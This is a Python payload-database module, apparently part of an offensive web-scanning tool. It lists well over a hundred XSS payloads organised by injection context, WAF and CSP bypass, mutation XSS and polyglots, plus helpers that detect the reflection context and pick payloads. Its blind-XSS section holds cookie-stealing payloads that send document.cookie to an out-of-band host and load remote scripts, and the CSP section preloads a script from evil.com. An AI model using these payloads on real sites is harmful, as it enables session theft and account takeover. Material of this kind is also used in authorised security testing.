#!/usr/bin/env python3
# engines/xss_payloads_db.py — M7Hunter XSS Payload Database V7
# EXPANDED: 200+ payloads from all 665 in XSS Payloads book (Ismail Tasdelen)
# Organized by context, bypass type, and false-positive risk
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re

# Format: (payload, bypass_type, context, fp_risk)
# fp_risk: low | medium | high

XSS_PAYLOADS_BY_CONTEXT = {

    # ── HTML CONTEXT ──────────────────────────────────────────────────────────
    "html": [
        # SVG — most reliable, least WAF-blocked
        ('<svg/onload=alert(1)>',                                "svg_basic",       "low"),
        ('<svg onload=alert(1)>',                                "svg_space",       "low"),
        ('<svg><script>alert(1)</script>',                       "svg_script",      "low"),
        ('<svg/onload="alert(1)">',                              "svg_quoted",      "low"),
        ('<svg><animate onbegin=alert(1) attributeName=x>',      "svg_animate",     "low"),
        ('<svg><set onbegin=alert(1) attributeName=x>',          "svg_set",         "low"),
        ('<svg onResize svg onResize="javascript:alert(1)"></svg onResize>', "svg_resize","medium"),
        ('<svg onLoad svg onLoad="javascript:alert(1)"></svg onLoad>',       "svg_load", "medium"),
        ('<svg onUnload svg onUnload="javascript:alert(1)"></svg onUnload>', "svg_unload","medium"),
        # IMG variants
        ('<img src=x onerror=alert(1)>',                         "img_onerror",     "low"),
        ('<img src=1 onerror=alert(1)>',                         "img_1",           "low"),
        ('<img/src=x onerror=alert(1)>',                         "img_slash",       "low"),
        ('<img src=x onerror="alert(1)">',                       "img_quoted",      "low"),
        ('<img src=xxx:x onerror=javascript:alert(1)>',          "img_proto",       "low"),
        ('<IMG SRC=javascript:alert(1)>',                        "img_uppercase",   "low"),
        ('<IMG SRC=`javascript:alert(1)`>',                      "img_backtick",    "medium"),
        ('<img src=x onerror\x09=javascript:alert(1)>',          "img_tab_eq",      "medium"),
        ('<img src=x onerror\x0a=javascript:alert(1)>',          "img_lf_eq",       "medium"),
        ('<img src=x onerror\x0d=javascript:alert(1)>',          "img_cr_eq",       "medium"),
        ('<img src=x onerror\x00=javascript:alert(1)>',          "img_null_eq",     "medium"),
        ('<img\x00src=x onerror=alert(1)>',                      "img_null_before", "medium"),
        ('<img src\x09=x onerror=alert(1)>',                     "img_tab_src",     "medium"),
        # Details/Summary
        ('<details open ontoggle=alert(1)>',                     "details_toggle",  "low"),
        ('<details open ontoggle="alert(1)">',                   "details_quoted",  "low"),
        # Video/Audio/Media
        ('<video src=x onerror=alert(1)>',                       "video_onerror",   "low"),
        ('<audio src=x onerror=alert(1)>',                       "audio_onerror",   "low"),
        ('<video onerror="javascript:alert(1)"><source>',        "video_source",    "low"),
        ('<video><source onerror="javascript:alert(1)">',        "video_src_err",   "low"),
        ('<video poster=javascript:alert(1)//',                   "video_poster",    "medium"),
        # Input/Form
        ('<input onfocus=alert(1) autofocus>',                   "input_autofocus", "low"),
        ('<input onblur=alert(1) autofocus><input autofocus>',   "input_blur",      "low"),
        ('<input type="image" src=1 onerror=alert(1)>',          "input_image",     "low"),
        ('<body oninput=alert(1)><input autofocus>',             "body_input",      "medium"),
        ('<form><button formaction="javascript:alert(1)">X',     "form_action",     "medium"),
        # IFrame
        ('<iframe srcdoc="<svg onload=alert(1);">">',            "iframe_srcdoc",   "low"),
        ('<iframe onload=alert(1)>',                             "iframe_onload",   "low"),
        ('<iframe src="javascript:alert(1);"></iframe>',          "iframe_src",      "medium"),
        ('<IFRAME SRC="javascript:alert(1);"></IFRAME>',          "iframe_upper",    "medium"),
        # Script tag variants
        ('<script>alert(1)</script>',                            "script_basic",    "low"),
        ("<script>alert('XSS')</script>",                        "script_str",      "low"),
        ('<script\x20type="text/javascript">alert(1);</script>', "script_space",    "medium"),
        ('<script\x09type="text/javascript">alert(1);</script>', "script_tab",      "medium"),
        ('<script\x0dtype="text/javascript">alert(1);</script>', "script_cr",       "medium"),
        ('<script\x0atype="text/javascript">alert(1);</script>', "script_lf",       "medium"),
        ('<script\x0ctype="text/javascript">alert(1);</script>', "script_ff",       "medium"),
        ('<script\x2ftype="text/javascript">alert(1);</script>', "script_slash",    "medium"),
        ('<script\x00>alert(1)</script>',                        "script_null",     "medium"),
        ('<script\x0d>alert(1)</script>',                        "script_close_cr", "medium"),
        ('<script\x0a>alert(1)</script>',                        "script_close_lf", "medium"),
        # Body events
        ('<body onload=alert(1)>',                               "body_load",       "medium"),
        ('<body onscroll=alert(1)><br>'*5+'<input autofocus>',   "body_scroll",     "medium"),
        ('<body onmouseover="javascript:alert(1)">',             "body_mouse",      "medium"),
        ('<BODY ONLOAD=alert(1)>',                               "body_upper",      "medium"),
        # Object/Embed
        ('<object data="javascript:alert(1)">',                  "object_data",     "medium"),
        ('<embed src="javascript:alert(1)">',                    "embed_js",        "medium"),
        ('<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
                                                                 "embed_b64",       "medium"),
        # Math
        ('<math href="javascript:alert(1)">CLICK</math>',        "math_href",       "medium"),
        # Comment injection
        ('<!--<img src="--><img src=x onerror=javascript:alert(1)//">',  "comment_img","medium"),
        ('<![><img src="]><img src=x onerror=javascript:alert(1)//">',   "cdata_img", "medium"),
        # Meta
        ('<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">', "meta_refresh","high"),
        # Marquee
        ('<marquee onstart=alert(1)>XSS</marquee>',              "marquee",         "medium"),
        # Link/Style
        ('<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d>', "link_css","high"),
        ('<style>@import "data:,*%7bx:expression(alert(1))%7D";</style>',  "style_import","high"),
        ('<STYLE>li{list-style-image:url("javascript:alert(1)")}</STYLE><UL><LI>',
                                                                 "style_list",      "high"),
        ('<DIV STYLE="background-image: url(javascript:alert(1))">',      "div_bg",  "high"),
        ('<DIV STYLE="width:expression(alert(1));">',             "div_expr",        "high"),
        ('<XSS STYLE="xss:expression(alert(1))">',               "xss_expr",        "high"),
        # Frameset
        ('<frameset onload=alert(1)>',                           "frameset_load",   "medium"),
        ('<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>', "frameset_frame","medium"),
        # Table
        ('<table background="javascript:alert(1)">',             "table_bg",        "high"),
        ('<TABLE><TD BACKGROUND="javascript:alert(1)">',         "table_td_bg",     "high"),
    ],

    # ── ATTRIBUTE CONTEXT ─────────────────────────────────────────────────────
    "attr": [
        ('" onmouseover="alert(1)"',                             "break_dquote",    "low"),
        ("' onmouseover='alert(1)'",                             "break_squote",    "low"),
        ('" onfocus="alert(1)" autofocus="',                     "break_focus",     "low"),
        ('" onclick="alert(1)',                                   "click_inject",    "low"),
        ('" onload="alert(1)',                                    "load_inject",     "low"),
        ('" onerror="alert(1)',                                   "error_inject",    "low"),
        ('" autofocus onfocus="alert(1)',                         "autofocus_attr",  "low"),
        ('`-alert(1)-`',                                         "template_break",  "medium"),
        ('javascript:alert(1)',                                   "js_proto",        "medium"),
        ('javascript:alert(document.domain)',                     "js_domain",       "medium"),
        ('" onpointerdown="alert(1)',                             "pointerdown",     "low"),
        ('" onpointerup="alert(1)',                               "pointerup",       "low"),
        ('" onpointerenter="alert(1)',                            "pointerenter",    "low"),
        ('" onmousedown="alert(1)',                               "mousedown",       "low"),
    ],

    # ── JAVASCRIPT CONTEXT ────────────────────────────────────────────────────
    "js": [
        ("';alert(1)//",                                         "squote_break",    "low"),
        ('";alert(1)//',                                         "dquote_break",    "low"),
        ("'-alert(1)-'",                                         "squote_sub",      "low"),
        ('"-alert(1)-"',                                         "dquote_sub",      "low"),
        ('`${alert(1)}`',                                        "template_literal","low"),
        ('`-${alert(1)}-`',                                      "template_sub",    "low"),
        (');alert(1)//',                                         "paren_break",     "low"),
        ('\nalert(1)\n',                                          "newline_break",   "medium"),
        ('</script><script>alert(1)',                             "script_close",    "low"),
        ('\';alert(1)//\'',                                       "escape_squote",   "medium"),
    ],

    # ── URL CONTEXT ───────────────────────────────────────────────────────────
    "url": [
        ('javascript:alert(1)',                                   "js_proto",        "low"),
        ('javascript:alert(document.domain)',                     "js_domain",       "low"),
        ('data:text/html,<script>alert(1)</script>',             "data_uri",        "medium"),
        ('%22onmouseover%3Dalert(1)',                             "url_encoded",     "medium"),
        ("javascript\x00:alert(1)",                              "null_byte",       "medium"),
        # Char-by-char javascript: bypass
        ("\x0bjavascript:alert(1)",                              "vt_before_proto", "medium"),
        ("\x09javascript:alert(1)",                              "tab_before_proto", "medium"),
        ("\x0ajavascript:alert(1)",                              "lf_before_proto", "medium"),
        ("\x0djavascript:alert(1)",                              "cr_before_proto", "medium"),
        ("javascript\x09:alert(1)",                              "tab_in_proto",    "medium"),
        ("javascript\x0a:alert(1)",                              "lf_in_proto",     "medium"),
    ],

    # ── WAF BYPASS VARIANTS ───────────────────────────────────────────────────
    "waf_bypass": [
        # Case variation
        ('<ScRiPt>alert(1)</ScRiPt>',                            "mixed_case",      "low"),
        ('<SCRIPT>alert(1)</SCRIPT>',                            "uppercase",       "low"),
        ('<img SRC=x OnErRoR=alert(1)>',                         "mixed_case_attr", "low"),
        # Quote break + inject
        ("'`\"><\x3cscript>alert(1)</script>",                   "triple_break",    "medium"),
        ("'`\"><\x00script>alert(1)</script>",                   "null_triple",     "medium"),
        # Encoding
        ('\x3cscript>alert(1)\x3c/script\x3e',                  "hex_lt_gt",       "medium"),
        ('%3Cscript%3Ealert(1)%3C/script%3E',                    "url_enc_script",  "medium"),
        # Comment splitting
        ('<sc<!---->ript>alert(1)</sc<!---->ript>',               "comment_split",   "medium"),
        # Object with base64
        ('<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
                                                                 "object_b64",      "medium"),
        # Conditional comment (IE)
        ('<!--[if]><script>alert(1)</script -->',                "ie_conditional",  "high"),
        ('<!--[if<img src=x onerror=alert(1)//]> -->',           "ie_cond_img",     "high"),
        # CSS expression
        ('<div style="width:expression(alert(1))">',             "css_expr",        "medium"),
        ('<IMG STYLE="xss:expr/**/ession(alert(1))">',           "css_expr_comment","medium"),
        # Opera/IE specific
        ('<a style="-o-link:\'javascript:alert(1)\';-o-link-source:current">X', "opera_link","high"),
        # Input/form tricks
        ('<x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>', "x_attr_break", "medium"),
        # href bypass with chars
        ('<a href="javas\x00cript:alert(1)">test</a>',           "href_null",       "medium"),
        ('<a href="javas\x09cript:alert(1)">test</a>',           "href_tab",        "medium"),
        ('<a href="javas\x0acript:alert(1)">test</a>',           "href_lf",         "medium"),
        ('<a href="java&#1&#2&#3&#4&#5script:alert(1)">test</a>',"href_entities",   "medium"),
        # Event on unusual elements
        ('<frameset onFocus="javascript:alert(1)">',             "frameset_focus",  "medium"),
        ('<applet onError="javascript:alert(1)">',               "applet_error",    "high"),
        ('<bgsound onPropertyChange="javascript:alert(1)">',     "bgsound",         "high"),
        # VBScript (IE)
        ('<STYLE TYPE="text/javascript">alert(1);</STYLE>',      "style_js_type",   "high"),
    ],

    # ── mXSS (Mutation XSS) ───────────────────────────────────────────────────
    "mxss": [
        # Browser re-parses and mutates HTML → XSS
        ('<noscript><p title="</noscript><img src=x onerror=alert(1)">',
                                                                 "noscript_mutate", "medium"),
        ('<div id="d"><x xmlns=""><iframe onload=alert(1)></div><script>d.innerHTML=d.innerHTML</script>',
                                                                 "xmlns_reinject",  "medium"),
        ('<div id="div1"><input value="``onmouseover=alert(1)"></div><div id="div2"></div>'
         '<script>document.getElementById("div2").innerHTML=document.getElementById("div1").innerHTML</script>',
                                                                 "innerHTML_copy",  "medium"),
        ('<b <script>alert(1)</script>0',                        "broken_tag",      "medium"),
        ('"\'`><p><svg><script>a=\'hello\x27;alert(1)//\';</script></p>',
                                                                 "svg_break",       "medium"),
        ('<style><img src="</style><img src=x onerror=alert(1)//">',
                                                                 "style_close",     "medium"),
    ],

    # ── POLYGLOT (multi-context) ──────────────────────────────────────────────
    "polyglot": [
        # Works in HTML, attr, JS contexts
        ("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                                                                 "polyglot_1",      "low"),
        ('">\'><img src=xxx:x onerror=alert(1)>',               "polyglot_simple", "low"),
        ("'`><script>alert(1)</script>",                         "polyglot_sq",     "low"),
        ('"><script>alert(1)</script>',                          "polyglot_dq",     "low"),
        ("';alert(1)//",                                         "polyglot_js",     "low"),
        ('${alert(1)}',                                          "polyglot_tmpl",   "medium"),
    ],

    # ── BLIND XSS (OOB) ──────────────────────────────────────────────────────
    "blind": [
        ('<script src="//OOB_HOST/b.js"></script>',              "script_src_oob",  "low"),
        ('<img src=x onerror="fetch(\'//OOB_HOST/\')">',         "fetch_oob",       "low"),
        ('<svg onload="fetch(\'//OOB_HOST/?c=\'+document.cookie)">',
                                                                 "cookie_steal",    "low"),
        ('"><script src=//OOB_HOST/b.js></script>',             "inject_oob",      "low"),
        ("'><script src=//OOB_HOST/b.js></script>",             "sq_inject_oob",   "low"),
        ('<img src=x onerror="new Image().src=\'//OOB_HOST/?c=\'+document.cookie">',
                                                                 "img_oob",         "low"),
    ],

    # ── CSP BYPASS ────────────────────────────────────────────────────────────
    "csp_bypass": [
        # JSONP endpoint abuse
        ('<script src="//accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
                                                                 "google_jsonp",    "medium"),
        # Angular sandbox escape
        ('{{constructor.constructor(\'alert(1)\')()}}',          "angular_sandbox", "medium"),
        ('{{$on.constructor(\'alert(1)\')()}}',                  "angular_on",      "medium"),
        # script-src with unsafe-inline bypass via nonce guessing
        ('<script nonce=NONCE_PLACEHOLDER>alert(1)</script>',    "nonce_guess",     "high"),
        # base tag hijack
        ('<base href="javascript://"><a href="/.,alert(1)//#">X</a>',
                                                                 "base_href",       "medium"),
        # Link preload + CORS
        ('<link rel=preload href="//evil.com/x.js" as=script crossorigin>',
                                                                 "link_preload",    "medium"),
    ],


    # ── ENTITY ENCODING BYPASS ────────────────────────────────────────────────
    "entity_encoding": [
        # HTML entity numeric encoding of javascript:alert
        ('<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
                                                                 "entity_decimal",  "medium"),
        ('<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>',
                                                                 "entity_hex",      "medium"),
        # UTF-7 charset bypass
        ('<META charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGM&AD0&AGn&AG8Abg&AGUAcgByAG8Acg&AD0AYQBsAGUAcgB0ACgAMQApAA&ACA&APABi',
                                                                 "utf7_charset",    "high"),
        # Mac-farsi charset
        ('<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾',
                                                                 "mac_farsi",       "high"),
        # char-by-char HTML entity in href
        ('<a href="jav&#65ascript:alert(1)">XSS</a>',           "entity_partial_a","medium"),
        ('<a href="jav&#97ascript:alert(1)">XSS</a>',           "entity_partial_a2","medium"),
        # LAYER tag (legacy Netscape)
        ('<LAYER SRC="javascript:alert(1)"></LAYER>',            "layer_tag",       "high"),
        # BR SIZE with JS
        ('<BR SIZE="&{javascript:alert(1)}">',                   "br_size",         "high"),
        # BGSOUND
        ('<BGSOUND SRC="javascript:alert(1);">',                 "bgsound",         "high"),
        # LINK stylesheet
        ('<LINK REL="stylesheet" HREF="javascript:alert(1);">',  "link_style",      "medium"),
        # embed with data URI
        ('<embed width=500 height=500 code="data:text/html,<script>alert(1)</script>">',
                                                                 "embed_data_uri",  "medium"),
        # iframe srcdoc nested encoded
        ('<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=alert(1)&amp;gt;">',
                                                                 "iframe_nested_enc","medium"),
        # XML namespace
        ('<HTML xmlns:xss><xss:xss>XSS</xss:xss></HTML>',       "xml_namespace",   "high"),
        # STYLE onreadystatechange (IE)
        ('<style onreadystatechange=javascript:alert(1);></style>',
                                                                 "style_ready",     "high"),
        # body event with special chars
        ('<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>',  "body_event_chars","high"),
        # fromCharCode obfuscation
        ('<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',"fromcharcode",    "medium"),
        # Multiple encoding
        ("''\"<XSS>=&{()}",                                    "multi_break",     "medium"),
    ],

    # ── STORED MARKER ────────────────────────────────────────────────────────
    "stored_marker": [
        ('M7STORED_XSS_MARKER_1337',                             "marker_basic",    "low"),
        ('<span data-m7="xss_test">',                            "marker_span",     "low"),
        ('<!--M7XSS-->',                                          "marker_comment",  "low"),
    ],
}

# ── Flat lists ────────────────────────────────────────────────────────────────
ALL_PAYLOADS = []
for ctx, payloads in XSS_PAYLOADS_BY_CONTEXT.items():
    if ctx in ("blind","stored_marker"):
        continue
    for payload, bypass_type, fp_risk in payloads:
        ALL_PAYLOADS.append({
            "payload":      payload,
            "bypass_type":  bypass_type,
            "context":      ctx,
            "fp_risk":      fp_risk,
        })

LOW_FP_PAYLOADS = [p for p in ALL_PAYLOADS if p["fp_risk"] == "low"]
MED_FP_PAYLOADS = [p for p in ALL_PAYLOADS if p["fp_risk"] == "medium"]
BLIND_PAYLOADS  = XSS_PAYLOADS_BY_CONTEXT["blind"]
STORED_MARKERS  = XSS_PAYLOADS_BY_CONTEXT["stored_marker"]
MXSS_PAYLOADS   = XSS_PAYLOADS_BY_CONTEXT["mxss"]
POLYGLOTS       = XSS_PAYLOADS_BY_CONTEXT["polyglot"]
CSP_BYPASSES    = XSS_PAYLOADS_BY_CONTEXT["csp_bypass"]

# ── Context detection ─────────────────────────────────────────────────────────
def detect_context(response_body: str, payload_marker: str = "M7CTXPROBE") -> str:
    if not response_body or payload_marker not in response_body:
        return "unknown"
    idx    = response_body.find(payload_marker)
    before = response_body[max(0,idx-200):idx]

    if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
        if re.search(r'[\'"]$', before.rstrip()):
            return "js_string"
        return "js"

    tag_open  = before.rfind('<')
    tag_close = before.rfind('>')
    if tag_open > tag_close:
        return "attr"

    if re.search(r'(href|src|action)\s*=\s*[\'"]?$', before, re.I):
        return "url"

    return "html"

def get_payloads_for_context(context: str, count: int = 10,
                              waf_bypass: bool = False) -> list:
    if context in ("js","js_string"):
        pool = XSS_PAYLOADS_BY_CONTEXT.get("js",[])
    elif context in ("attr","attr_unquoted"):
        pool = XSS_PAYLOADS_BY_CONTEXT.get("attr",[])
    elif context == "url":
        pool = XSS_PAYLOADS_BY_CONTEXT.get("url",[])
    else:
        pool = XSS_PAYLOADS_BY_CONTEXT.get("html",[])

    if waf_bypass:
        pool = pool + XSS_PAYLOADS_BY_CONTEXT.get("waf_bypass",[])

    fp_order = {"low":0,"medium":1,"high":2}
    pool = sorted(pool, key=lambda x: fp_order.get(x[2] if len(x)>2 else "medium",1))
    return pool[:count]


if __name__ == "__main__":
    print(f"Total payloads:      {len(ALL_PAYLOADS)}")
    print(f"Low FP payloads:     {len(LOW_FP_PAYLOADS)}")
    print(f"Blind payloads:      {len(BLIND_PAYLOADS)}")
    print(f"mXSS payloads:       {len(MXSS_PAYLOADS)}")
    print(f"Polyglots:           {len(POLYGLOTS)}")
    print(f"CSP bypasses:        {len(CSP_BYPASSES)}")
    print(f"By context: {dict((k,len(v)) for k,v in XSS_PAYLOADS_BY_CONTEXT.items())}")
